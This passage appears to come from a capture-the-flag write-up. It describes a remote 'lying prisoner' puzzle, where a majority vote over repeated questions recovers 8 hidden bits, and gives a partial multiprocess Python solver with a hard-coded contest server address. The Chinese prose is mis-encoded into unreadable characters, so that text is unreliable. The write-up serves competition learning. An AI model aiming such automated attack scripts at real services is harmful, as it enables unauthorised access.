<code>not</code>ï¼ˆå°½ç®¡è§£æå™¨å†…éƒ¨æ”¯æŒ <code>not</code>ï¼Œä½†ç™½åå•æ²¡æœ‰å®ƒï¼‰ã€‚</p></li><li><p>è§£æå™¨ <code>interrogate()</code> ä¼šå°† <code>S0</code>..<code>S7</code> æ›¿æ¢ä¸ºçœŸæ­£çš„å¸ƒå°”å€¼å¹¶è¯„ä¼°è¡¨è¾¾å¼ï¼›éšå <code>interrogate_prisoner()</code> ä½¿ç”¨ <code>responses[i]</code>ï¼ˆtruth æˆ– lieï¼‰å¯¹ç»“æœåšç¿»è½¬æˆ–ä¸ç¿»è½¬ï¼Œå†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p></li><li><p><strong>å…³é”®ç‚¹ï¼ˆæ¼æ´ï¼‰</strong>ï¼šå› ä¸ºæ¯è½®æ­£å¥½ 17 æ¬¡å›ç­”ä¸”æ°æœ‰ <strong>2 æ¬¡è¯´è°</strong>ï¼Œå¦‚æœä½ å¯¹åŒä¸€ä½ï¼ˆæ¯”å¦‚ <code>S0 == 1</code>ï¼‰<strong>é‡å¤è¯¢é—® 17 æ¬¡</strong>ï¼Œç”±äºå…¶ä¸­åªæœ‰ 2 æ¬¡æ˜¯ lieï¼Œ<strong>å¤šæ•°æŠ•ç¥¨ï¼ˆmajorityï¼‰ä¸€å®šç­‰äºçœŸå®å€¼</strong>ï¼ˆ15 vs 2ï¼‰ã€‚è€ŒæœåŠ¡å™¨å¹¶æ²¡æœ‰é™åˆ¶é‡å¤é—®é¢˜æˆ–ç¦æ­¢ç›¸åŒé—®é¢˜å¤šæ¬¡å‡ºç°ã€‚</p><p>  å› æ­¤å¯ä»¥å¯¹æ¯ä¸ª S0..S7 é€ä¸€é‡å¤é—® 17 æ¬¡å¹¶å–å¤šæ•°ç¥¨æ¥æ¢å¤çœŸå®çš„ 8bitã€‚</p></li><li><p>å¦å¤–ï¼Œè¿æ¥å»ºç«‹æ—¶ä¼šæœ‰ä¸€ä¸ª PoWï¼ˆè¯æ˜å·¥ä½œï¼‰æ­¥éª¤ï¼šæœåŠ¡å‘å‡º <code>sha256(XXXX+&#123;proof[4:]&#125;) == &lt;digest&gt;</code>ï¼Œè¦ä½ æ‰¾å‡º 4 å­—èŠ‚çš„ <code>XXXX</code> ä½¿å¾—å“ˆå¸ŒåŒ¹é…ã€‚<code>XXXX</code> å¿…é¡»æ˜¯é•¿åº¦ 4 çš„ ASCII</p></li><li>æ‰€ä»¥åªéœ€è¦æ¯è½®äº¤äº’éšæœºè¿›è¡Œç”Ÿæˆåå¤ç¡®è®¤å°±è¡Œï¼Œå•çº¿ç¨‹æœ‰ç‚¹ä¸ç¨³å®šï¼Œç”¨aiè·‘sokcetè·‘äº†ä¸ªå¤šçº¿ç¨‹</li></ul><p>è„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, sys, itertools, random, re, time, select</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Event, Queue, cpu_count</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== å‚æ•°ï¼ˆå…¼é¡¾é€Ÿåº¦ä¸ç¨³å¥ï¼‰ ========</span></span><br><span class="line">HOST = <span class="string">&quot;8.147.135.168&quot;</span></span><br><span class="line">PORT = <span class="number">30736</span></span><br><span class="line">N_QUERIES = <span class="number">17</span></span><br><span class="line">ROUNDS = <span class="number">25</span></span><br><span class="line">SEED_BASE = <span class="number">42</span></span><br><span class="line"></span><br><span class="line">READ_TIMEOUT = <span class="number">7.0</span>           <span class="comment"># å…¨å±€è¯»è¶…æ—¶ï¼ˆç§’ï¼‰</span></span><br><span class="line">WRITE_TIMEOUT = <span class="number">7.0</span>          <span class="comment"># å†™è¶…æ—¶ï¼ˆç§’ï¼‰</span></span><br><span class="line">PROMPT_TIMEOUT = <span class="number">2.5</span>         <span class="comment"># æ¯é¢˜ç­‰å¾…â€œAsk your questionâ€è¶…æ—¶</span></span><br><span class="line">PER_Q_TIMEOUT = <span class="number">3.5</span>          <span class="comment"># å•é¢˜å›ç­”è¯»å–è¶…æ—¶</span></span><br><span class="line">LINE_MAXLEN = <span class="number">32768</span></span><br><span class="line">RECV_SOFT_LIMIT_LINES = <span class="number">60</span></span><br><span class="line">MAX_ERROR_BITS = <span class="number">3</span>           <span class="comment"># å®¹é”™ 3ï¼šå¯¹æŠ—å¶å‘è¯¯åˆ¤/ç²˜åŒ…</span></span><br><span class="line">RETRY_PER_ROUND = <span class="number">2</span>          <span class="comment"># æ¯è½®æœ€å¤šé‡è¯• 2 æ¬¡</span></span><br><span class="line">POW_WAIT_MAX = <span class="number">200</span>         <span class="comment"># å¹¶è¡Œ PoW æœ€é•¿ç­‰å¾…</span></span><br><span class="line">VERBOSE = <span class="literal">False</span>              <span class="comment"># è®¾ True è¾“å‡ºæ›´è¯¦ç»†æ—¥å¿—</span></span><br><span class="line"><span class="comment"># ======================================</span></span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- ä½å±‚ç½‘ç»œï¼šselect+recv è¡Œçº§ IO ----------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LineIO</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sock: socket.socket</span>):</span><br><span class="line">        <span class="variable language_">self</span>.sock = sock</span><br><span class="line">        <span class="variable language_">self</span>.buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.sock.settimeout(<span class="literal">None</span>)  <span class="comment"># ç”¨ select æ§åˆ¶è¶…æ—¶</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeln</span>(<span class="params">self, s: <span class="built_in">str</span></span>):</span><br><span class="line">        data = (s.rstrip(<span class="string">&quot;\r\n&quot;</span>) + <span class="string">&quot;\n&quot;</span>).encode()</span><br><span class="line">        end = time.time() + WRITE_TIMEOUT</span><br><span class="line">        mv = <span class="built_in">memoryview</span>(data)</span><br><span class="line">        sent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> sent &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            remain = end - time.time()</span><br><span class="line">            <span class="keyword">if</span> remain &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> TimeoutError(<span class="string">&quot;write timed out&quot;</span>)</span><br><span class="line">            _, w, _ = select.select([], [<span class="variable language_">self</span>.sock], [], remain)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> w:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            n = <span class="variable language_">self</span>.sock.send(mv[sent:])</span><br><span class="line">            <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> OSError(<span class="string">&quot;socket closed while writing&quot;</span>)</span><br><span class="line">            sent += n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv_some</span>(<span class="params">self, timeout: <span class="built_in">float</span></span>):</span><br><span class="line">        <span class="keyword">if</span> timeout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> timeout &lt; <span class="number">0</span>:</span><br><span class="line">            timeout = <span class="number">0</span></span><br><span class="line">        r, _, _ = select.select([<span class="variable language_">self</span>.sock], [], [], timeout)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> r:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.sock.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">except</span> BlockingIOError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">readline</span>(<span class="params">self, timeout: <span class="built_in">float</span> = READ_TIMEOUT</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        end = time.time() + (timeout <span class="keyword">if</span> timeout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">1e9</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            pos = <span class="variable language_">self</span>.buf.find(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> pos != -<span class="number">1</span>:</span><br><span class="line">                line = <span class="variable language_">self</span>.buf[:pos+<span class="number">1</span>]; <span class="variable language_">self</span>.buf = <span class="variable language_">self</span>.buf[pos+<span class="number">1</span>:]</span><br><span class="line">                <span class="keyword">return</span> line.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> time.time() &gt;= end:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            chunk = <span class="variable language_">self</span>._recv_some(end - time.time())</span><br><span class="line">            <span class="keyword">if</span> chunk == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.buf:</span><br><span class="line">                    line = <span class="variable language_">self</span>.buf; <span class="variable language_">self</span>.buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">return</span> line.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="variable language_">self</span>.buf += chunk</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.buf) &gt; LINE_MAXLEN:</span><br><span class="line">                line = <span class="variable language_">self</span>.buf[:LINE_MAXLEN]; <span class="variable language_">self</span>.buf = <span class="variable language_">self</span>.buf[LINE_MAXLEN:]</span><br><span class="line">                <span class="keyword">return</span> line.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_until_any</span>(<span class="params">self, patterns, timeout=READ_TIMEOUT, max_lines=RECV_SOFT_LIMIT_LINES</span>):</span><br><span class="line">        compiled = [re.<span class="built_in">compile</span>(p, re.I) <span class="keyword">for</span> p <span class="keyword">in</span> patterns]</span><br><span class="line">        end = time.time() + (timeout <span class="keyword">if</span> timeout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">1e9</span>)</span><br><span class="line">        lines, midx = [], -<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lines) &lt; max_lines <span class="keyword">and</span> time.time() &lt; end:</span><br><span class="line">            line = <span class="variable language_">self</span>.readline(timeout=end - time.time())</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line: <span class="keyword">break</span></span><br><span class="line">            lines.append(line)</span><br><span class="line">            <span class="keyword">for</span> i, pr <span class="keyword">in</span> <span class="built_in">enumerate</span>(compiled):</span><br><span class="line">                <span class="keyword">if</span> pr.search(line):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(lines), i</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(lines), midx</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_some_lines</span>(<span class="params">self, n=<span class="number">1</span>, timeout=READ_TIMEOUT</span>):</span><br><span class="line">        end = time.time() + (timeout <span class="keyword">if</span> timeout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">1e9</span>)</span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> time.time() &gt;= end: <span class="keyword">break</span></span><br><span class="line">            line = <span class="variable language_">self</span>.readline(timeout=end - time.time())</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line: <span class="keyword">break</span></span><br><span class="line">            out.append(line)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcp_tune</span>(<span class="params">sock: socket.socket</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(socket, <span class="string">&quot;TCP_KEEPIDLE&quot;</span>):</span><br><span class="line">            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, <span class="number">60</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(socket, <span class="string">&quot;TCP_KEEPINTVL&quot;</span>):</span><br><span class="line">            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(socket, <span class="string">&quot;TCP_KEEPCNT&quot;</span>):</span><br><span class="line">            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, <span class="number">1</span>)  <span class="comment"># ç«‹å‘å°åŒ…</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- æŸ¥è¯¢æ„é€  ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_two</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;( ( &#123;&#125; and ( &#123;&#125; == 0 ) ) or ( ( &#123;&#125; == 0 ) and &#123;&#125; ) )&quot;</span>.<span class="built_in">format</span>(a, b, a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_expr_for_indices</span>(<span class="params">indices</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> indices: <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">    expr = <span class="string">f&quot;S<span class="subst">&#123;indices[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> indices[<span class="number">1</span>:]:</span><br><span class="line">        expr = xor_two(expr, <span class="string">f&quot;S<span class="subst">&#123;idx&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> expr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rank_gf2</span>(<span class="params">A</span>):</span><br><span class="line">    A = [row[:] <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    m = <span class="built_in">len</span>(A); n = <span class="built_in">len</span>(A[<span class="number">0</span>]) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        piv = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, m):</span><br><span class="line">            <span class="keyword">if</span> A[i][c]: piv = i; <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> piv <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">        A[r], A[piv] = A[piv], A[r]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> i != r <span class="keyword">and</span> A[i][c]:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c, n):</span><br><span class="line">                    A[i][j] ^= A[r][j]</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> r == m: <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_queries</span>(<span class="params">n_queries, seed=<span class="literal">None</span></span>):</span><br><span class="line">    rnd = random.Random(seed)</span><br><span class="line">    rows = []</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rows = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            mask = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) <span class="keyword">if</span> rnd.choice([<span class="number">0</span>,<span class="number">1</span>])]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> mask: mask = [rnd.randrange(<span class="number">8</span>)]</span><br><span class="line">            rows.append(mask)</span><br><span class="line">        A = [[<span class="number">1</span> <span class="keyword">if</span> j <span class="keyword">in</span> row <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> rows]</span><br><span class="line">        <span class="keyword">if</span> rank_gf2(A) == <span class="number">8</span>: <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rows) &lt; n_queries:</span><br><span class="line">        mask = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) <span class="keyword">if</span> rnd.choice([<span class="number">0</span>,<span class="number">1</span>])]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mask: mask = [rnd.randrange(<span class="number">8</span>)]</span><br><span class="line">        rows.append(mask)</span><br><span class="line">    queries = [<span class="string">f&quot;( <span class="subst">&#123;xor_expr_for_indices(mask)&#125;</span> ) == 1&quot;</span> <span class="keyword">for</span> mask <span class="keyword">in</span> rows]</span><br><span class="line">    <span class="keyword">return</span> rows, queries</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- GF(2) æ±‚è§£ + ä½è¿ç®—éªŒè¯ ----------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gf2</span>(<span class="params">A, b</span>):</span><br><span class="line">    m = <span class="built_in">len</span>(A)</span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>: <span class="keyword">return</span> [<span class="number">0</span>]* (<span class="number">0</span> <span class="keyword">if</span> <span class="built_in">len</span>(A)==<span class="number">0</span> <span class="keyword">else</span> <span class="built_in">len</span>(A[<span class="number">0</span>]))</span><br><span class="line">    n = <span class="built_in">len</span>(A[<span class="number">0</span>])</span><br><span class="line">    M = [row[:] + [bit] <span class="keyword">for</span> row, bit <span class="keyword">in</span> <span class="built_in">zip</span>(A, b)]</span><br><span class="line">    r = <span class="number">0</span>; pivs = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        sel = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, m):</span><br><span class="line">            <span class="keyword">if</span> M[i][c] == <span class="number">1</span>: sel = i; <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sel <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">        M[r], M[sel] = M[sel], M[r]</span><br><span class="line">        pivs.append(c)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> i != r <span class="keyword">and</span> M[i][c] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> j 